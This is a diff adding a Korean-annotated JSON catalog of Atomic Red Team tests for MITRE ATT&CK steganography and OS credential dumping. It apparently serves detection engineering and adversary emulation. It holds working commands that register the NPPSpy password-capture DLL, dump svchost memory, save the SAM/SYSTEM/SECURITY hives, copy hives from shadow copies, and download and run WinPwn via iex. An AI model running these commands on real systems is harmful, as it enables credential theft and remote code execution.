@@ -1,0 +1,1928 @@
+[
+{
+  "technique_id": "T1001.002",
+  "technique_name": "Data Obfuscation via Steganography",
+  "tactic": "Command and Control",
+  "source": "AtomicRedTeam",
+  "description": "이미지, 오디오 등의 파일에 데이터를 숨겨 통신 내용을 난독화하는 기법이다. 공격자는 파일 전송이나 웹 요청처럼 보이도록 위장해 명령·제어 트래픽이나 유출 데이터를 숨길 수 있다. 전통적인 보안 장비는 정상 멀티미디어 파일로 인식해 탐지가 어려워지며, 네트워크·콘텐츠 분석을 함께 해야 한다.",
+  "tests": [
+    {
+      "test_id": "T1001.002-1",
+      "name": "Steganographic Tarball Embedding",
+      "platforms": [
+        "windows"
+      ],
+      "summary": "이미지 파일과 tar 아카이브를 사용해 데이터를 은닉하는 스테가노그래피 기반 데이터 유출 시나리오를 시뮬레이션한다. 랜덤 패스워드를 생성해 tar 파일에 저장한 뒤, 이미지 바이트와 이어붙여 새로운 이미지 파일을 생성한다.",
+      "procedure": [
+        "지정된 경로에 테스트용 이미지 파일이 존재하는지 확인하고, 없으면 원격 저장소에서 다운로드한다.",
+        "랜덤 패스워드를 여러 개 생성해 텍스트 파일(<passwords_file>)로 저장한다.",
+        "<passwords_file>을 포함하는 tarz/tar 아카이브(<tar_file>)를 생성한다.",
+        "원본 이미지(<image_file>)와 tar 파일(<tar_file>)을 바이트 단위로 읽어 이어붙이고, 새 이미지(<new_image_file>)로 저장한다."
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "Get-Content \"#{image_file}\", \"#{tar_file}\" -Encoding byte -ReadCount 0 | Set-Content \"#{new_image_file}\" -Encoding byte"
+        }
+      ],
+      "prerequisites": [
+        "테스트에 사용할 이미지 파일(<image_file>)이 존재해야 한다. 없으면 원격 URL에서 다운로드해 준비한다.",
+        "랜덤 패스워드를 생성해 <passwords_file>에 저장해야 한다.",
+        "<passwords_file>을 포함하는 tarz/tar 아카이브(<tar_file>)가 생성되어 있어야 한다."
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "%TEMP%\\random_passwords.txt",
+            "description": "랜덤으로 생성된 여러 개의 패스워드를 저장한 텍스트 파일"
+          },
+          {
+            "path": "%PUBLIC%\\Downloads\\T1001.002.tarz",
+            "description": "패스워드 텍스트 파일을 포함하는 tarz/tar 아카이브"
+          },
+          {
+            "path": "%PUBLIC%\\Downloads\\T1001.002New.jpg",
+            "description": "tar 아카이브가 은닉된 새 이미지 파일(스테가노그래피 적용 결과)"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "PathToAtomicsFolder\\T1001.002\\bin\\T1001.002.jpg",
+            "description": "데이터 은닉에 사용되는 원본 이미지 파일"
+          },
+          {
+            "path": "%PUBLIC%\\Downloads\\T1001.002.tarz",
+            "description": "이미지에 삽입되는 tarz/tar 아카이브 파일"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "이미지와 tar 파일을 바이트 단위로 처리해 새 이미지를 생성하는 데 사용된 PowerShell",
+            "commandline_pattern": "Get-Content * -Encoding byte -ReadCount 0 | Set-Content *"
+          }
+        ],
+        "network": []
+      },
+      "cleanup": [
+        "테스트 후 새로 생성된 이미지 파일(<new_image_file>)을 삭제해 은닉 데이터를 제거할 수 있다.",
+        "테스트용 tarz/tar 파일(<tar_file>)과 패스워드 파일(<passwords_file>)을 삭제해 흔적을 줄일 수 있다."
+      ],
+      "metadata": {
+        "atomic_source_id": "c7921449-8b62-4c4d-8a83-d9281ac0190b",
+        "reference_links": [
+          "https://attack.mitre.org/techniques/T1001/002/",
+          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1001.002"
+        ]
+      }
+    },
+    {
+      "test_id": "T1001.002-2",
+      "name": "Embedded Script in Image Execution via Extract-Invoke-PSImage",
+      "platforms": [
+        "windows"
+      ],
+      "summary": "악성 PowerShell 스크립트를 이미지 파일에 숨긴 뒤, Extract-Invoke-PSImage 스크립트를 사용해 내용을 추출·디코딩하고 실행하는 과정을 시뮬레이션한다. 결과적으로 정상적인 이미지처럼 보이는 파일을 통해 숨겨진 명령(Start-Process notepad)을 실행한다.",
+      "procedure": [
+        "테스트에 사용할 악성 이미지(<image_file>)와 Extract-Invoke-PSImage 스크립트(<psimage_script>) 존재 여부를 확인한다.",
+        "필요 시 원격 GitHub 저장소에서 이미지와 Extract-Invoke-PSImage.ps1을 다운로드해 준비한다.",
+        "Extract-Invoke-PSImage 모듈을 로드하고, 이미지에서 숨겨진 PowerShell 스크립트를 추출해 result.ps1로 저장한다.",
+        "result.ps1에서 base64 인코딩된 페이로드를 추출해 디코딩하고 decoded.ps1 및 textExtraction.ps1로 저장한다.",
+        "최종 추출된 textExtraction.ps1 스크립트를 실행하여 내장된 명령(Start-Process notepad)을 수행한다."
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "cd \"PathToAtomicsFolder\\ExternalPayloads\\\"; Import-Module .\\Extract-Invoke-PSImage.ps1; $extractedScript = Extract-Invoke-PSImage -Image \"#{image_file}\" -Out \"$HOME\\result.ps1\"; $scriptContent = Get-Content \"$HOME\\result.ps1\" -Raw; $base64Pattern = \"(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])\"; $base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }; $base64Strings | Set-Content \"$HOME\\decoded.ps1\"; $decodedContent = Get-Content \"$HOME\\decoded.ps1\" -Raw; $decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent)); $textPattern = '^.+'; $textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }; $scriptPath = \"$HOME\\textExtraction.ps1\"; $textMatches -join '' | Set-Content -Path $scriptPath; . \"$HOME\\textExtraction.ps1\""
+        }
+      ],
+      "prerequisites": [
+        "악성 이미지 파일(<image_file>)이 존재해야 한다. 없으면 지정된 GitHub URL에서 다운로드한다.",
+        "Extract-Invoke-PSImage.ps1 스크립트(<psimage_script>)가 존재해야 한다. 없으면 ExternalPayloads 디렉터리에 다운로드한다.",
+        "PathToAtomicsFolder 및 ExternalPayloads 경로가 올바르게 설정되어 있어야 한다."
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "$HOME\\result.ps1",
+            "description": "Extract-Invoke-PSImage를 통해 이미지에서 추출된 원본 PowerShell 스크립트"
+          },
+          {
+            "path": "$HOME\\decoded.ps1",
+            "description": "result.ps1에서 추출한 base64 문자열을 저장한 파일"
+          },
+          {
+            "path": "$HOME\\textExtraction.ps1",
+            "description": "base64 디코딩 후 실제 실행 가능한 PowerShell 명령이 포함된 스크립트"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "PathToAtomicsFolder\\T1001.002\\bin\\evil_kitten.jpg",
+            "description": "숨겨진 PowerShell 페이로드가 포함된 악성 이미지 파일"
+          },
+          {
+            "path": "PathToAtomicsFolder\\ExternalPayloads\\Extract-Invoke-PSImage.ps1",
+            "description": "이미지에서 스크립트를 추출하는 데 사용되는 도구 스크립트"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "이미지에서 스크립트를 추출·디코딩하고 최종 페이로드를 실행하는 데 사용된 PowerShell",
+            "commandline_pattern": "Extract-Invoke-PSImage -Image *; *FromBase64String*; textExtraction.ps1"
+          }
+        ],
+        "network": [
+          {
+            "description": "GitHub에서 악성 이미지 및 Extract-Invoke-PSImage 스크립트를 다운로드하는 HTTP/HTTPS 통신 가능성"
+          }
+        ]
+      },
+      "cleanup": [
+        "테스트 후 $HOME\\result.ps1, $HOME\\decoded.ps1, $HOME\\textExtraction.ps1 파일을 삭제해 스크립트 흔적을 제거할 수 있다.",
+        "다운로드한 악성 이미지 파일과 Extract-Invoke-PSImage.ps1 스크립트도 필요 시 삭제해 환경을 원복할 수 있다."
+      ],
+      "metadata": {
+        "atomic_source_id": "04bb8e3d-1670-46ab-a3f1-5cee64da29b6",
+        "reference_links": [
+          "https://attack.mitre.org/techniques/T1001/002/",
+          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1001.002"
+        ]
+      }
+    }
+  ]
+}
+,
+{
+  "technique_id": "T1003",
+  "technique_name": "OS Credential Dumping",
+  "tactic": "Credential Access",
+  "source": "AtomicRedTeam",
+  "description": "운영체제에서 계정 자격 증명(해시, 평문 비밀번호 등)을 덤프해 탈취하는 기법이다.",
+  "tests": [
+    {
+      "test_id": "T1003-1",
+      "name": "Gsecdump",
+      "platforms": ["windows"],
+      "summary": "Gsecdump 도구를 사용해 메모리에서 계정 자격 증명과 해시를 덤프한다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "\"#{gsecdump_exe}\" -a"
+        }
+      ],
+      "artifacts": {
+        "files": [
+          "PathToAtomicsFolder\\..\\ExternalPayloads\\gsecdump.exe (자격 증명 덤프 도구)"
+        ],
+        "registry": [],
+        "processes": [
+          "gsecdump.exe (메모리에서 크리덴셜 덤프)"
+        ],
+        "network": [
+          "https://web.archive.org/.../gsecdump-v2b5.exe (도구 다운로드)"
+        ]
+      },
+      "tags": {
+        "action": ["process_start"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping"]
+      }
+    },
+    {
+      "test_id": "T1003-2",
+      "name": "Credential Dumping with NPPSpy",
+      "platforms": ["windows"],
+      "summary": "NPPSpy 네트워크 프로바이더 DLL을 등록해 로그인 시 평문 비밀번호를 C:\\NPPSpy.txt에 기록한다.",
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "Copy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"; $path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER; $UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"; Set-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore; $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore; $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore; echo \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\""
+        }
+      ],
+      "artifacts": {
+        "files": [
+          "C:\\Windows\\System32\\NPPSPY.dll",
+          "C:\\NPPSpy.txt (로그인 시 저장된 평문 비밀번호)"
+        ],
+        "registry": [
+          "HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider"
+        ],
+        "processes": [
+          "powershell.exe (DLL 복사 및 레지스트리 조작)"
+        ],
+        "network": [
+          "https://github.com/gtworek/PSBits/.../NPPSPY.dll (DLL 다운로드)"
+        ]
+      },
+      "tags": {
+        "action": ["file_create", "registry_modification", "process_start"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "NetworkProvider_Hijack"]
+      }
+    },
+    {
+      "test_id": "T1003-3",
+      "name": "Dump svchost.exe to gather RDP credentials",
+      "platforms": ["windows"],
+      "summary": "RDP 연결을 처리하는 svchost.exe 프로세스를 MiniDump 해 TEMP 경로에 svchost-exe.dmp를 생성한다.",
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id } ; C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full"
+        }
+      ],
+      "artifacts": {
+        "files": [
+          "%TEMP%\\svchost-exe.dmp (svchost 메모리 덤프)"
+        ],
+        "registry": [],
+        "processes": [
+          "powershell.exe (Get-NetTCPConnection 및 MiniDump 호출)",
+          "rundll32.exe (comsvcs.dll MiniDump)"
+        ],
+        "network": [
+          "TCP 3389 (RDP Established 세션이 있을 수 있음)"
+        ]
+      },
+      "tags": {
+        "action": ["process_start", "memory_dump"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "RDP_Credential_Dump"]
+      }
+    },
+    {
+      "test_id": "T1003-4",
+      "name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)",
+      "platforms": ["windows"],
+      "summary": "IIS appcmd.exe list 옵션으로 애플리케이션 풀 정보를 조회해 서비스 계정 자격 증명을 확인한다.",
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:* ; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:* ; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*"
+        }
+      ],
+      "artifacts": {
+        "files": [],
+        "registry": [],
+        "processes": [
+          "appcmd.exe (IIS 애플리케이션 풀 나열)",
+          "powershell.exe (appcmd 호출)"
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["process_start"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "WebService_Credential_Enumeration"]
+      }
+    },
+    {
+      "test_id": "T1003-5",
+      "name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)",
+      "platforms": ["windows"],
+      "summary": "appcmd.exe list apppool /config 명령으로 IIS 애플리케이션 풀 전체 구성을 덤프해 서비스 계정 정보를 확인한다.",
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config"
+        }
+      ],
+      "artifacts": {
+        "files": [],
+        "registry": [],
+        "processes": [
+          "appcmd.exe (애플리케이션 풀 구성 덤프)",
+          "powershell.exe (appcmd /config 호출)"
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["process_start"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "WebService_Credential_Enumeration"]
+      }
+    },
+    {
+      "test_id": "T1003-6",
+      "name": "Dump Credential Manager using keymgr.dll and rundll32.exe",
+      "platforms": ["windows"],
+      "summary": "rundll32.exe로 keymgr.dll의 KRShowKeyMgr를 호출해 Credential Manager UI를 띄우고 자격 증명을 내보낼 수 있게 한다.",
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "rundll32.exe keymgr,KRShowKeyMgr"
+        }
+      ],
+      "artifacts": {
+        "files": [
+          "*.crd (Credential Manager 내보내기 파일, 경로는 사용자 지정)"
+        ],
+        "registry": [],
+        "processes": [
+          "rundll32.exe (keymgr,KRShowKeyMgr 호출)"
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["process_start", "credential_export"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "Credential_Manager_Export"]
+      }
+    },
+    {
+      "test_id": "T1003-7",
+      "name": "Send NTLM Hash with RPC Test Connection",
+      "platforms": ["windows"],
+      "summary": "rpcping 유틸리티로 RPC 테스트 연결을 보내면서 NTLM 인증을 강제로 수행하게 한다.",
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "rpcping -s #{server_ip} -e #{custom_port} -a privacy -u NTLM 1>$Null"
+        }
+      ],
+      "artifacts": {
+        "files": [],
+        "registry": [],
+        "processes": [
+          "rpcping.exe (RPC 테스트 및 NTLM 인증 유도)",
+          "powershell.exe (rpcping 호출)"
+        ],
+        "network": [
+          "RPC/NTLM 트래픽 (server_ip:custom_port 로 향하는 테스트 연결)"
+        ]
+      },
+      "tags": {
+        "action": ["process_start", "network_connection"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "NTLM_Hash_Exposure"]
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1003.002",
+  "technique_name": "OS Credential Dumping: Security Account Manager",
+  "tactic": "Credential Access",
+  "source": "AtomicRedTeam",
+  "description": "SAM, SYSTEM, SECURITY 레지스트리 하이브를 덤프하거나 복사해 로컬 계정 해시·캐시 크리덴셜·LSA 시크릿을 추출하는 기법이다. 볼륨 섀도 카피, 레지스트리 백업/익스포트, 전용 도구(pypykatz, WinPwn 등)를 통해 비관리자 계정까지 크리덴셜 노출로 이어질 수 있다.",
+  "tests": [
+    {
+      "test_id": "T1003.002-1",
+      "name": "Registry dump of SAM, creds, and secrets",
+      "platforms": ["windows"],
+      "summary": "reg save를 사용해 HKLM\\sam, HKLM\\system, HKLM\\security 하이브를 %temp% 경로로 저장해 SAM, 캐시 크리덴셜, LSA 시크릿을 수집하는 시나리오다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "reg save HKLM\\sam %temp%\\sam\r\nreg save HKLM\\system %temp%\\system\r\nreg save HKLM\\security %temp%\\security"
+        }
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "%temp%\\sam",
+            "description": "SAM 하이브 백업"
+          },
+          {
+            "path": "%temp%\\system",
+            "description": "SYSTEM 하이브 백업"
+          },
+          {
+            "path": "%temp%\\security",
+            "description": "SECURITY 하이브 백업"
+          }
+        ],
+        "files_read": [],
+        "registry_keys": [
+          {
+            "path": "HKLM\\sam",
+            "description": "로컬 SAM 데이터"
+          },
+          {
+            "path": "HKLM\\system",
+            "description": "시스템 구성 및 부트 키 정보"
+          },
+          {
+            "path": "HKLM\\security",
+            "description": "LSA 시크릿을 포함한 보안 관련 정보"
+          }
+        ],
+        "processes": [
+          {
+            "name": "reg.exe",
+            "description": "레지스트리 하이브를 파일로 저장하는 도구",
+            "commandline_pattern": "reg save HKLM\\* %temp%\\*"
+          }
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["registry_export", "file_create"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "SAM_Dump"]
+      }
+    },
+    {
+      "test_id": "T1003.002-2",
+      "name": "Registry parse with pypykatz",
+      "platforms": ["windows"],
+      "summary": "pypykatz를 파이썬 가상환경에서 실행해 LSASS/LSA 관련 레지스트리 하이브를 파싱하고 저장된 크리덴셜을 추출하는 시나리오다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "\"#{venv_path}\\Scripts\\pypykatz\" live lsa"
+        }
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_002",
+            "description": "pypykatz 실행에 사용되는 Python 가상환경(기본값 venv_path)"
+          }
+        ],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "pypykatz",
+            "description": "LSA/LSASS 관련 데이터를 파싱해 크리덴셜을 추출하는 도구",
+            "commandline_pattern": "pypykatz live lsa"
+          }
+        ],
+        "network": [
+          {
+            "description": "선행 단계에서 Python 인스톨러 및 pypykatz 패키지 다운로드를 위한 HTTP/HTTPS 트래픽 발생 가능"
+          }
+        ]
+      },
+      "tags": {
+        "action": ["process_start"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "LSA_Secrets_Dump"]
+      }
+    },
+    {
+      "test_id": "T1003.002-3",
+      "name": "esentutl.exe SAM copy",
+      "platforms": ["windows"],
+      "summary": "esentutl.exe와 VSS를 이용해 SAM 하이브 파일을 복사한다. 기본값 기준 %SystemRoot%\\system32\\config\\SAM을 %temp%로 복사해 해시 추출에 사용한다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}"
+        }
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "#{copy_dest}\\#{file_name}",
+            "description": "VSS를 통해 복사된 SAM 하이브(기본값: %temp%\\SAM)"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "%SystemRoot%\\system32\\config\\SAM",
+            "description": "원본 SAM 하이브 파일"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "esentutl.exe",
+            "description": "VSS 기반으로 하이브/파일을 복사하는 유틸리티",
+            "commandline_pattern": "esentutl.exe /y /vss *SAM*"
+          }
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["file_copy", "vss_access"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "SAM_Dump"]
+      }
+    },
+    {
+      "test_id": "T1003.002-4",
+      "name": "PowerDump Hashes and Usernames from Registry",
+      "platforms": ["windows"],
+      "summary": "Invoke-PowerDump.ps1 스크립트를 로드해 레지스트리에서 해시와 사용자 정보를 읽어오는 PowerDump 기반 해시덤프 시나리오다.",
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green; Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\"; Invoke-PowerDump"
+        }
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1",
+            "description": "원격 GitHub에서 다운로드된 PowerDump PowerShell 스크립트"
+          }
+        ],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "PowerDump 모듈을 로드하고 Invoke-PowerDump를 실행하는 PowerShell 프로세스",
+            "commandline_pattern": "Import-Module *PowerDump.ps1*; Invoke-PowerDump"
+          }
+        ],
+        "network": [
+          {
+            "description": "GitHub에서 Invoke-PowerDump.ps1를 다운로드하는 HTTP/HTTPS 트래픽"
+          }
+        ]
+      },
+      "tags": {
+        "action": ["script_download", "process_start"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "Registry_Hashdump"]
+      }
+    },
+    {
+      "test_id": "T1003.002-5",
+      "name": "dump volume shadow copy hives with certutil",
+      "platforms": ["windows"],
+      "summary": "HiveNightmare/SeriousSAM 취약점을 악용해 certutil로 볼륨 섀도 카피에서 SAM 등 하이브를 덤프하고 %temp%에 저장하는 비관리자 계정 기반 시나리오다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": false,
+          "command": "for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\#{target_hive}\" %temp%\\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\\#{target_hive}vss*"
+        }
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "%temp%\\#{target_hive}vss*",
+            "description": "각 섀도 카피에서 certutil로 덤프한 대상 하이브의 헥스 인코딩 파일"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy*\\Windows\\System32\\config\\#{target_hive}",
+            "description": "섀도 카피에 있는 대상 하이브(SAM 등)"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "certutil.exe",
+            "description": "섀도 카피에서 하이브 파일을 인코딩·덤프하는 유틸리티",
+            "commandline_pattern": "certutil -f -v -encodehex *HarddiskVolumeShadowCopy*\\Windows\\System32\\config\\*"
+          }
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["file_create", "vss_access"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "HiveNightmare", "SAM_Dump"]
+      }
+    },
+    {
+      "test_id": "T1003.002-6",
+      "name": "dump volume shadow copy hives with System.IO.File",
+      "platforms": ["windows"],
+      "summary": "PowerShell의 System.IO.File.Copy를 이용해 볼륨 섀도 카피에서 SAM 등 하이브를 $env:TEMP로 복사하는 HiveNightmare 기반 시나리오다.",
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "1..#{limit} | % { try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\" , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {} ; ls \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore }"
+        }
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "$env:TEMP\\#{target_hive}vss*",
+            "description": "System.IO.File.Copy를 사용해 각 섀도 카피에서 복사된 하이브 파일"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy*\\Windows\\System32\\config\\#{target_hive}",
+            "description": "섀도 카피 내 대상 하이브 파일"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "System.IO.File.Copy로 섀도 카피 하이브를 TEMP로 복사하는 PowerShell",
+            "commandline_pattern": "[System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy*\\Windows\\System32\\config\\*\", \"$env:TEMP\\*vss*\""
+          }
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["file_create", "vss_access"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "HiveNightmare", "SAM_Dump"]
+      }
+    },
+    {
+      "test_id": "T1003.002-7",
+      "name": "WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes",
+      "platforms": ["windows"],
+      "summary": "WinPwn.ps1을 원격에서 로드해 samfile 함수로 SAM 파일을 덤프하고 NTLM 해시를 수집하는 로컬 크리덴셜 루팅 시나리오다.",
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); samfile -consoleoutput -noninteractive"
+        }
+      ],
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "WinPwn 스크립트를 다운로드·로드한 뒤 samfile 함수를 실행하는 PowerShell 프로세스",
+            "commandline_pattern": "downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn*'); samfile -consoleoutput -noninteractive"
+          }
+        ],
+        "network": [
+          {
+            "description": "GitHub에서 WinPwn.ps1를 다운로드하는 HTTP/HTTPS 트래픽"
+          }
+        ]
+      },
+      "tags": {
+        "action": ["script_download", "process_start"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "SAM_Dump"]
+      }
+    },
+    {
+      "test_id": "T1003.002-8",
+      "name": "Dumping of SAM, creds, and secrets (Reg Export)",
+      "platforms": ["windows"],
+      "summary": "reg export를 사용해 HKLM\\sam, HKLM\\system, HKLM\\security 하이브를 %temp%로 내보내 SAM, 캐시 크리덴셜, LSA 시크릿을 수집하는 시나리오다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "reg export HKLM\\sam %temp%\\sam\r\nreg export HKLM\\system %temp%\\system\r\nreg export HKLM\\security %temp%\\security"
+        }
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "%temp%\\sam",
+            "description": "reg export로 생성된 SAM 하이브 백업"
+          },
+          {
+            "path": "%temp%\\system",
+            "description": "reg export로 생성된 SYSTEM 하이브 백업"
+          },
+          {
+            "path": "%temp%\\security",
+            "description": "reg export로 생성된 SECURITY 하이브 백업"
+          }
+        ],
+        "files_read": [],
+        "registry_keys": [
+          {
+            "path": "HKLM\\sam",
+            "description": "로컬 SAM 데이터"
+          },
+          {
+            "path": "HKLM\\system",
+            "description": "시스템 구성 및 부트 키 정보"
+          },
+          {
+            "path": "HKLM\\security",
+            "description": "LSA 시크릿을 포함한 보안 관련 정보"
+          }
+        ],
+        "processes": [
+          {
+            "name": "reg.exe",
+            "description": "레지스트리 키를 파일로 내보내는 도구",
+            "commandline_pattern": "reg export HKLM\\* %temp%\\*"
+          }
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["registry_export", "file_create"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "SAM_Dump"]
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1003.003",
+  "technique_name": "OS Credential Dumping: NTDS",
+  "tactic": "Credential Access",
+  "source": "AtomicRedTeam",
+  "description": "도메인 컨트롤러에서 NTDS.dit(Active Directory 데이터베이스)와 SYSTEM 하이브를 볼륨 섀도 카피(VSS)·NTDSUtil·WMI 등을 통해 복사하거나 덤프해 도메인 계정 자격 증명을 탈취하는 기법이다.",
+  "tests": [
+    {
+      "test_id": "T1003.003-1",
+      "name": "Create Volume Shadow Copy with vssadmin",
+      "platforms": ["windows"],
